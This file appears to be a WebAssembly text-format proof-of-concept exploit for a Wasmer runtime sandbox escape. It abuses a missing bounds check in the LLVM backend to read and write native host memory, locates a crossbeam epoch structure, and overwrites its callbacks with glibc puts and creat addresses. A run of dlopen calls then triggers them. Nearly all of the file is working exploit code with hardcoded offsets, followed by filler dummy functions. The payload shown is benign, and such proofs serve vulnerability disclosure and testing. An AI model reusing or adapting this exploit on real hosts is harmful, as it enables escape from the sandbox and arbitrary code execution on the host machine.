(module
  ;; The stock 7.2.1 CLI's LLVM backend omits the static-reservation-end check.
  ;; All native corruption below is constrained to this disposable proof.
  (import "env" "memory" (memory 1 65536 shared))
  (import "env" "__indirect_function_table" (table 1 funcref))
  (import "env" "__stack_pointer" (global (mut i32)))
  (import "wasi_snapshot_preview1" "proc_exit" (func $proc_exit (param i32)))
  (import "wasix_32v1" "dlopen" (func $dlopen (param i32 i32 i32 i32 i32 i32 i32 i32) (result i32)))
  (data (i32.const 1024) "/trigger00.so")
  (data (i32.const 1056) "/trigger01.so")
  (data (i32.const 1088) "/trigger02.so")
  (data (i32.const 1120) "/trigger03.so")
  (data (i32.const 1152) "/trigger04.so")
  (data (i32.const 1184) "/trigger05.so")
  (data (i32.const 1216) "/trigger06.so")
  (data (i32.const 1248) "/trigger07.so")
  (data (i32.const 1280) "/trigger08.so")
  (data (i32.const 1312) "/trigger09.so")
  (data (i32.const 1344) "/trigger10.so")
  (data (i32.const 1376) "/trigger11.so")
  (data (i32.const 1408) "/trigger12.so")
  (data (i32.const 1440) "/trigger13.so")
  (data (i32.const 1472) "/trigger14.so")
  (data (i32.const 1504) "/trigger15.so")
  (data (i32.const 1536) "/trigger16.so")
  (data (i32.const 1568) "/trigger17.so")
  (data (i32.const 1600) "/trigger18.so")
  (data (i32.const 1632) "/trigger19.so")
  (data (i32.const 1664) "/trigger20.so")
  (data (i32.const 1696) "/trigger21.so")
  (data (i32.const 1728) "/trigger22.so")
  (data (i32.const 1760) "/trigger23.so")
  (data (i32.const 1792) "/trigger24.so")
  (data (i32.const 1824) "/trigger25.so")
  (data (i32.const 1856) "/trigger26.so")
  (data (i32.const 1888) "/trigger27.so")
  (data (i32.const 1920) "/trigger28.so")
  (data (i32.const 1952) "/trigger29.so")
  (data (i32.const 1984) "/trigger30.so")
  (data (i32.const 2016) "/trigger31.so")
  (data (i32.const 2048) "/trigger32.so")
  (data (i32.const 2080) "/trigger33.so")
  (data (i32.const 2112) "/trigger34.so")
  (data (i32.const 2144) "/trigger35.so")
  (data (i32.const 2176) "/trigger36.so")
  (data (i32.const 2208) "/trigger37.so")
  (data (i32.const 2240) "/trigger38.so")
  (data (i32.const 2272) "/trigger39.so")
  (data (i32.const 2304) "/trigger40.so")
  (data (i32.const 2336) "/trigger41.so")
  (data (i32.const 2368) "/trigger42.so")
  (data (i32.const 2400) "/trigger43.so")
  (data (i32.const 2432) "/trigger44.so")
  (data (i32.const 2464) "/trigger45.so")
  (data (i32.const 2496) "/trigger46.so")
  (data (i32.const 2528) "/trigger47.so")
  (data (i32.const 2560) "/trigger48.so")
  (data (i32.const 2592) "/trigger49.so")
  (data (i32.const 2624) "/trigger50.so")
  (data (i32.const 2656) "/trigger51.so")
  (data (i32.const 2688) "/trigger52.so")
  (data (i32.const 2720) "/trigger53.so")
  (data (i32.const 2752) "/trigger54.so")
  (data (i32.const 2784) "/trigger55.so")
  (data (i32.const 2816) "/trigger56.so")
  (data (i32.const 2848) "/trigger57.so")
  (data (i32.const 2880) "/trigger58.so")
  (data (i32.const 2912) "/trigger59.so")
  (data (i32.const 2944) "/trigger60.so")
  (data (i32.const 2976) "/trigger61.so")
  (data (i32.const 3008) "/trigger62.so")
  (data (i32.const 3040) "/trigger63.so")
  ;; Deferred::call passes a pointer to its 24-byte inline data as native RDI.
  (data (i32.const 6000) "/tmp/wasmer-says-hi\00")
  (data (i32.const 6032) "WASMER NATIVE SAYS HI!\00")
  (func (export "_start")
    (local $callback i64) (local $bag i32) (local $scan i32)
    (local $candidate i64) (local $j i32) (local $ok i32)
    ;; At +6 GiB, scan the first glibc worker arena for crossbeam_epoch::Bag:
    ;; 64 identical Deferred::NO_OP function pointers, 32 bytes apart.
    i32.const 2048 local.set $scan
    (block $found
      (loop $scan_loop
        i32.const -2147483647 local.get $scan i32.add
        i64.load offset=4294967295 align=1
        local.set $candidate
        i32.const 1 local.set $ok
        local.get $candidate i64.eqz
        if i32.const 0 local.set $ok end
        i32.const 1 local.set $j
        (block $verify_done
          (loop $verify
            local.get $ok i32.eqz br_if $verify_done
            i32.const -2147483647 local.get $scan i32.add
            local.get $j i32.const 32 i32.mul i32.add
            i64.load offset=4294967295 align=1
            local.get $candidate i64.ne
            if i32.const 0 local.set $ok br $verify_done end
            local.get $j i32.const 1 i32.add local.tee $j
            i32.const 64 i32.lt_u br_if $verify
          )
        )
        local.get $ok
        if local.get $scan local.set $bag br $found end
        local.get $scan i32.const 8 i32.add local.tee $scan
        i32.const 12288 i32.lt_u br_if $scan_loop
      )
    )
    ;; Exit without touching native state if the pinned layout signature is absent.
    local.get $bag i32.eqz
    if i32.const 86 call $proc_exit end
    ;; Bag+0x898 contains a stable glibc-2.43 pointer at libc+0x64fe8.
    ;; First forge entry 62 as puts(+0x8eb40) with a lighthearted native message.
    i32.const -2147483647 local.get $bag i32.add i32.const 2200 i32.add
    i64.load offset=4294967295 align=1
    i64.const 170840 i64.add local.set $callback
    i32.const 0 local.set $j
    (loop $write_puts_function
      i32.const -2147483647 local.get $bag i32.add i32.const 1984 i32.add local.get $j i32.add
      local.get $callback local.get $j i64.extend_i32_u i64.const 8 i64.mul i64.shr_u i32.wrap_i64
      i32.store8 offset=4294967295
      local.get $j i32.const 1 i32.add local.tee $j i32.const 8 i32.lt_u br_if $write_puts_function
    )
    i32.const 0 local.set $j
    (loop $write_message
      i32.const -2147483647 local.get $bag i32.add i32.const 1992 i32.add local.get $j i32.add
      i32.const 6032 local.get $j i32.add i32.load8_u
      i32.store8 offset=4294967295
      local.get $j i32.const 1 i32.add local.tee $j i32.const 24 i32.lt_u br_if $write_message
    )
    ;; Then forge entry 63 as creat(+0x123080) with the marker pathname.
    i32.const -2147483647 local.get $bag i32.add i32.const 2200 i32.add
    i64.load offset=4294967295 align=1
    i64.const 778392 i64.add local.set $callback
    ;; Replace callbacks byte-by-byte, avoiding LLVM's problematic wide OOB
    ;; constant stores, then set Bag.len to 64.
    i32.const 0 local.set $j
    (loop $write_function
      i32.const -2147483647 local.get $bag i32.add i32.const 2016 i32.add local.get $j i32.add
      local.get $callback local.get $j i64.extend_i32_u i64.const 8 i64.mul i64.shr_u i32.wrap_i64
      i32.store8 offset=4294967295
      local.get $j i32.const 1 i32.add local.tee $j i32.const 8 i32.lt_u br_if $write_function
    )
    i32.const 0 local.set $j
    (loop $write_command
      i32.const -2147483647 local.get $bag i32.add i32.const 2024 i32.add local.get $j i32.add
      i32.const 6000 local.get $j i32.add i32.load8_u
      i32.store8 offset=4294967295
      local.get $j i32.const 1 i32.add local.tee $j i32.const 24 i32.lt_u br_if $write_command
    )
    i32.const -2147483647 local.get $bag i32.add i32.const 2048 i32.add
    i32.const 64 i32.store8 offset=4294967295
    ;; Unique side-module hashes repeatedly exercise Rayon/crossbeam collection.
    i32.const 1024 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1056 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1088 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1120 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1152 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1184 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1216 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1248 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1280 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1312 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1344 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1376 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1408 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1440 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1472 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1504 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1536 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1568 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1600 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1632 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1664 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1696 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1728 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1760 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1792 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1824 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1856 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1888 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1920 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1952 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 1984 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2016 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2048 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2080 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2112 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2144 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2176 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2208 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2240 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2272 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2304 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2336 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2368 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2400 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2432 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2464 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2496 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2528 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2560 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2592 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2624 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2656 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2688 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2720 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2752 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2784 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2816 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2848 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2880 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2912 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2944 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 2976 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 3008 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
    i32.const 3040 i32.const 13 i32.const 1
    i32.const 4096 i32.const 256 i32.const 0 i32.const 0 i32.const 512
    call $dlopen drop
  )
  (func $dummy0 (param i32) (result i32) local.get 0 i32.const 0 i32.xor)
  (func $dummy1 (param i32) (result i32) local.get 0 i32.const 1 i32.xor)
  (func $dummy2 (param i32) (result i32) local.get 0 i32.const 2 i32.xor)
  (func $dummy3 (param i32) (result i32) local.get 0 i32.const 3 i32.xor)
  (func $dummy4 (param i32) (result i32) local.get 0 i32.const 4 i32.xor)
  (func $dummy5 (param i32) (result i32) local.get 0 i32.const 5 i32.xor)
  (func $dummy6 (param i32) (result i32) local.get 0 i32.const 6 i32.xor)
  (func $dummy7 (param i32) (result i32) local.get 0 i32.const 7 i32.xor)
  (func $dummy8 (param i32) (result i32) local.get 0 i32.const 8 i32.xor)
  (func $dummy9 (param i32) (result i32) local.get 0 i32.const 9 i32.xor)
  (func $dummy10 (param i32) (result i32) local.get 0 i32.const 10 i32.xor)
  (func $dummy11 (param i32) (result i32) local.get 0 i32.const 11 i32.xor)
  (func $dummy12 (param i32) (result i32) local.get 0 i32.const 12 i32.xor)
  (func $dummy13 (param i32) (result i32) local.get 0 i32.const 13 i32.xor)
  (func $dummy14 (param i32) (result i32) local.get 0 i32.const 14 i32.xor)
  (func $dummy15 (param i32) (result i32) local.get 0 i32.const 15 i32.xor)
  (func $dummy16 (param i32) (result i32) local.get 0 i32.const 16 i32.xor)
  (func $dummy17 (param i32) (result i32) local.get 0 i32.const 17 i32.xor)
  (func $dummy18 (param i32) (result i32) local.get 0 i32.const 18 i32.xor)
  (func $dummy19 (param i32) (result i32) local.get 0 i32.const 19 i32.xor)
  (func $dummy20 (param i32) (result i32) local.get 0 i32.const 20 i32.xor)
  (func $dummy21 (param i32) (result i32) local.get 0 i32.const 21 i32.xor)
  (func $dummy22 (param i32) (result i32) local.get 0 i32.const 22 i32.xor)
  (func $dummy23 (param i32) (result i32) local.get 0 i32.const 23 i32.xor)
  (func $dummy24 (param i32) (result i32) local.get 0 i32.const 24 i32.xor)
  (func $dummy25 (param i32) (result i32) local.get 0 i32.const 25 i32.xor)
  (func $dummy26 (param i32) (result i32) local.get 0 i32.const 26 i32.xor)
  (func $dummy27 (param i32) (result i32) local.get 0 i32.const 27 i32.xor)
  (func $dummy28 (param i32) (result i32) local.get 0 i32.const 28 i32.xor)
  (func $dummy29 (param i32) (result i32) local.get 0 i32.const 29 i32.xor)
  (func $dummy30 (param i32) (result i32) local.get 0 i32.const 30 i32.xor)
  (func $dummy31 (param i32) (result i32) local.get 0 i32.const 31 i32.xor)
  (func $dummy32 (param i32) (result i32) local.get 0 i32.const 32 i32.xor)
  (func $dummy33 (param i32) (result i32) local.get 0 i32.const 33 i32.xor)
  (func $dummy34 (param i32) (result i32) local.get 0 i32.const 34 i32.xor)
  (func $dummy35 (param i32) (result i32) local.get 0 i32.const 35 i32.xor)
  (func $dummy36 (param i32) (result i32) local.get 0 i32.const 36 i32.xor)
  (func $dummy37 (param i32) (result i32) local.get 0 i32.const 37 i32.xor)
  (func $dummy38 (param i32) (result i32) local.get 0 i32.const 38 i32.xor)
  (func $dummy39 (param i32) (result i32) local.get 0 i32.const 39 i32.xor)
  (func $dummy40 (param i32) (result i32) local.get 0 i32.const 40 i32.xor)
  (func $dummy41 (param i32) (result i32) local.get 0 i32.const 41 i32.xor)
  (func $dummy42 (param i32) (result i32) local.get 0 i32.const 42 i32.xor)
  (func $dummy43 (param i32) (result i32) local.get 0 i32.const 43 i32.xor)
  (func $dummy44 (param i32) (result i32) local.get 0 i32.const 44 i32.xor)
  (func $dummy45 (param i32) (result i32) local.get 0 i32.const 45 i32.xor)
  (func $dummy46 (param i32) (result i32) local.get 0 i32.const 46 i32.xor)
  (func $dummy47 (param i32) (result i32) local.get 0 i32.const 47 i32.xor)
  (func $dummy48 (param i32) (result i32) local.get 0 i32.const 48 i32.xor)
  (func $dummy49 (param i32) (result i32) local.get 0 i32.const 49 i32.xor)
  (func $dummy50 (param i32) (result i32) local.get 0 i32.const 50 i32.xor)
  (func $dummy51 (param i32) (result i32) local.get 0 i32.const 51 i32.xor)
  (func $dummy52 (param i32) (result i32) local.get 0 i32.const 52 i32.xor)
  (func $dummy53 (param i32) (result i32) local.get 0 i32.const 53 i32.xor)
  (func $dummy54 (param i32) (result i32) local.get 0 i32.const 54 i32.xor)
  (func $dummy55 (param i32) (result i32) local.get 0 i32.const 55 i32.xor)
  (func $dummy56 (param i32) (result i32) local.get 0 i32.const 56 i32.xor)
  (func $dummy57 (param i32) (result i32) local.get 0 i32.const 57 i32.xor)
  (func $dummy58 (param i32) (result i32) local.get 0 i32.const 58 i32.xor)
  (func $dummy59 (param i32) (result i32) local.get 0 i32.const 59 i32.xor)
  (func $dummy60 (param i32) (result i32) local.get 0 i32.const 60 i32.xor)
  (func $dummy61 (param i32) (result i32) local.get 0 i32.const 61 i32.xor)
  (func $dummy62 (param i32) (result i32) local.get 0 i32.const 62 i32.xor)
  (func $dummy63 (param i32) (result i32) local.get 0 i32.const 63 i32.xor)
  (func $dummy64 (param i32) (result i32) local.get 0 i32.const 64 i32.xor)
  (func $dummy65 (param i32) (result i32) local.get 0 i32.const 65 i32.xor)
  (func $dummy66 (param i32) (result i32) local.get 0 i32.const 66 i32.xor)
  (func $dummy67 (param i32) (result i32) local.get 0 i32.const 67 i32.xor)
  (func $dummy68 (param i32) (result i32) local.get 0 i32.const 68 i32.xor)
  (func $dummy69 (param i32) (result i32) local.get 0 i32.const 69 i32.xor)
  (func $dummy70 (param i32) (result i32) local.get 0 i32.const 70 i32.xor)
  (func $dummy71 (param i32) (result i32) local.get 0 i32.const 71 i32.xor)
  (func $dummy72 (param i32) (result i32) local.get 0 i32.const 72 i32.xor)
  (func $dummy73 (param i32) (result i32) local.get 0 i32.const 73 i32.xor)
  (func $dummy74 (param i32) (result i32) local.get 0 i32.const 74 i32.xor)
  (func $dummy75 (param i32) (result i32) local.get 0 i32.const 75 i32.xor)
  (func $dummy76 (param i32) (result i32) local.get 0 i32.const 76 i32.xor)
  (func $dummy77 (param i32) (result i32) local.get 0 i32.const 77 i32.xor)
  (func $dummy78 (param i32) (result i32) local.get 0 i32.const 78 i32.xor)
  (func $dummy79 (param i32) (result i32) local.get 0 i32.const 79 i32.xor)
  (func $dummy80 (param i32) (result i32) local.get 0 i32.const 80 i32.xor)
  (func $dummy81 (param i32) (result i32) local.get 0 i32.const 81 i32.xor)
  (func $dummy82 (param i32) (result i32) local.get 0 i32.const 82 i32.xor)
  (func $dummy83 (param i32) (result i32) local.get 0 i32.const 83 i32.xor)
  (func $dummy84 (param i32) (result i32) local.get 0 i32.const 84 i32.xor)
  (func $dummy85 (param i32) (result i32) local.get 0 i32.const 85 i32.xor)
  (func $dummy86 (param i32) (result i32) local.get 0 i32.const 86 i32.xor)
  (func $dummy87 (param i32) (result i32) local.get 0 i32.const 87 i32.xor)
  (func $dummy88 (param i32) (result i32) local.get 0 i32.const 88 i32.xor)
  (func $dummy89 (param i32) (result i32) local.get 0 i32.const 89 i32.xor)
  (func $dummy90 (param i32) (result i32) local.get 0 i32.const 90 i32.xor)
  (func $dummy91 (param i32) (result i32) local.get 0 i32.const 91 i32.xor)
  (func $dummy92 (param i32) (result i32) local.get 0 i32.const 92 i32.xor)
  (func $dummy93 (param i32) (result i32) local.get 0 i32.const 93 i32.xor)
  (func $dummy94 (param i32) (result i32) local.get 0 i32.const 94 i32.xor)
  (func $dummy95 (param i32) (result i32) local.get 0 i32.const 95 i32.xor)
  (func $dummy96 (param i32) (result i32) local.get 0 i32.const 96 i32.xor)
  (func $dummy97 (param i32) (result i32) local.get 0 i32.const 97 i32.xor)
  (func $dummy98 (param i32) (result i32) local.get 0 i32.const 98 i32.xor)
  (func $dummy99 (param i32) (result i32) local.get 0 i32.const 99 i32.xor)
  (func $dummy100 (param i32) (result i32) local.get 0 i32.const 100 i32.xor)
  (func $dummy101 (param i32) (result i32) local.get 0 i32.const 101 i32.xor)
  (func $dummy102 (param i32) (result i32) local.get 0 i32.const 102 i32.xor)
  (func $dummy103 (param i32) (result i32) local.get 0 i32.const 103 i32.xor)
  (func $dummy104 (param i32) (result i32) local.get 0 i32.const 104 i32.xor)
  (func $dummy105 (param i32) (result i32) local.get 0 i32.const 105 i32.xor)
  (func $dummy106 (param i32) (result i32) local.get 0 i32.const 106 i32.xor)
  (func $dummy107 (param i32) (result i32) local.get 0 i32.const 107 i32.xor)
  (func $dummy108 (param i32) (result i32) local.get 0 i32.const 108 i32.xor)
  (func $dummy109 (param i32) (result i32) local.get 0 i32.const 109 i32.xor)
  (func $dummy110 (param i32) (result i32) local.get 0 i32.const 110 i32.xor)
  (func $dummy111 (param i32) (result i32) local.get 0 i32.const 111 i32.xor)
  (func $dummy112 (param i32) (result i32) local.get 0 i32.const 112 i32.xor)
  (func $dummy113 (param i32) (result i32) local.get 0 i32.const 113 i32.xor)
  (func $dummy114 (param i32) (result i32) local.get 0 i32.const 114 i32.xor)
  (func $dummy115 (param i32) (result i32) local.get 0 i32.const 115 i32.xor)
  (func $dummy116 (param i32) (result i32) local.get 0 i32.const 116 i32.xor)
  (func $dummy117 (param i32) (result i32) local.get 0 i32.const 117 i32.xor)
  (func $dummy118 (param i32) (result i32) local.get 0 i32.const 118 i32.xor)
  (func $dummy119 (param i32) (result i32) local.get 0 i32.const 119 i32.xor)
  (func $dummy120 (param i32) (result i32) local.get 0 i32.const 120 i32.xor)
  (func $dummy121 (param i32) (result i32) local.get 0 i32.const 121 i32.xor)
  (func $dummy122 (param i32) (result i32) local.get 0 i32.const 122 i32.xor)
  (func $dummy123 (param i32) (result i32) local.get 0 i32.const 123 i32.xor)
  (func $dummy124 (param i32) (result i32) local.get 0 i32.const 124 i32.xor)
  (func $dummy125 (param i32) (result i32) local.get 0 i32.const 125 i32.xor)
  (func $dummy126 (param i32) (result i32) local.get 0 i32.const 126 i32.xor)
  (func $dummy127 (param i32) (result i32) local.get 0 i32.const 127 i32.xor)
  (func $dummy128 (param i32) (result i32) local.get 0 i32.const 128 i32.xor)
  (func $dummy129 (param i32) (result i32) local.get 0 i32.const 129 i32.xor)
  (func $dummy130 (param i32) (result i32) local.get 0 i32.const 130 i32.xor)
  (func $dummy131 (param i32) (result i32) local.get 0 i32.const 131 i32.xor)
  (func $dummy132 (param i32) (result i32) local.get 0 i32.const 132 i32.xor)
  (func $dummy133 (param i32) (result i32) local.get 0 i32.const 133 i32.xor)
  (func $dummy134 (param i32) (result i32) local.get 0 i32.const 134 i32.xor)
  (func $dummy135 (param i32) (result i32) local.get 0 i32.const 135 i32.xor)
  (func $dummy136 (param i32) (result i32) local.get 0 i32.const 136 i32.xor)
  (func $dummy137 (param i32) (result i32) local.get 0 i32.const 137 i32.xor)
  (func $dummy138 (param i32) (result i32) local.get 0 i32.const 138 i32.xor)
  (func $dummy139 (param i32) (result i32) local.get 0 i32.const 139 i32.xor)
  (func $dummy140 (param i32) (result i32) local.get 0 i32.const 140 i32.xor)
  (func $dummy141 (param i32) (result i32) local.get 0 i32.const 141 i32.xor)
  (func $dummy142 (param i32) (result i32) local.get 0 i32.const 142 i32.xor)
  (func $dummy143 (param i32) (result i32) local.get 0 i32.const 143 i32.xor)
  (func $dummy144 (param i32) (result i32) local.get 0 i32.const 144 i32.xor)
  (func $dummy145 (param i32) (result i32) local.get 0 i32.const 145 i32.xor)
  (func $dummy146 (param i32) (result i32) local.get 0 i32.const 146 i32.xor)
  (func $dummy147 (param i32) (result i32) local.get 0 i32.const 147 i32.xor)
  (func $dummy148 (param i32) (result i32) local.get 0 i32.const 148 i32.xor)
  (func $dummy149 (param i32) (result i32) local.get 0 i32.const 149 i32.xor)
  (func $dummy150 (param i32) (result i32) local.get 0 i32.const 150 i32.xor)
  (func $dummy151 (param i32) (result i32) local.get 0 i32.const 151 i32.xor)
  (func $dummy152 (param i32) (result i32) local.get 0 i32.const 152 i32.xor)
  (func $dummy153 (param i32) (result i32) local.get 0 i32.const 153 i32.xor)
  (func $dummy154 (param i32) (result i32) local.get 0 i32.const 154 i32.xor)
  (func $dummy155 (param i32) (result i32) local.get 0 i32.const 155 i32.xor)
  (func $dummy156 (param i32) (result i32) local.get 0 i32.const 156 i32.xor)
  (func $dummy157 (param i32) (result i32) local.get 0 i32.const 157 i32.xor)
  (func $dummy158 (param i32) (result i32) local.get 0 i32.const 158 i32.xor)
  (func $dummy159 (param i32) (result i32) local.get 0 i32.const 159 i32.xor)
  (func $dummy160 (param i32) (result i32) local.get 0 i32.const 160 i32.xor)
  (func $dummy161 (param i32) (result i32) local.get 0 i32.const 161 i32.xor)
  (func $dummy162 (param i32) (result i32) local.get 0 i32.const 162 i32.xor)
  (func $dummy163 (param i32) (result i32) local.get 0 i32.const 163 i32.xor)
  (func $dummy164 (param i32) (result i32) local.get 0 i32.const 164 i32.xor)
  (func $dummy165 (param i32) (result i32) local.get 0 i32.const 165 i32.xor)
  (func $dummy166 (param i32) (result i32) local.get 0 i32.const 166 i32.xor)
  (func $dummy167 (param i32) (result i32) local.get 0 i32.const 167 i32.xor)
  (func $dummy168 (param i32) (result i32) local.get 0 i32.const 168 i32.xor)
  (func $dummy169 (param i32) (result i32) local.get 0 i32.const 169 i32.xor)
  (func $dummy170 (param i32) (result i32) local.get 0 i32.const 170 i32.xor)
  (func $dummy171 (param i32) (result i32) local.get 0 i32.const 171 i32.xor)
  (func $dummy172 (param i32) (result i32) local.get 0 i32.const 172 i32.xor)
  (func $dummy173 (param i32) (result i32) local.get 0 i32.const 173 i32.xor)
  (func $dummy174 (param i32) (result i32) local.get 0 i32.const 174 i32.xor)
  (func $dummy175 (param i32) (result i32) local.get 0 i32.const 175 i32.xor)
  (func $dummy176 (param i32) (result i32) local.get 0 i32.const 176 i32.xor)
  (func $dummy177 (param i32) (result i32) local.get 0 i32.const 177 i32.xor)
  (func $dummy178 (param i32) (result i32) local.get 0 i32.const 178 i32.xor)
  (func $dummy179 (param i32) (result i32) local.get 0 i32.const 179 i32.xor)
  (func $dummy180 (param i32) (result i32) local.get 0 i32.const 180 i32.xor)
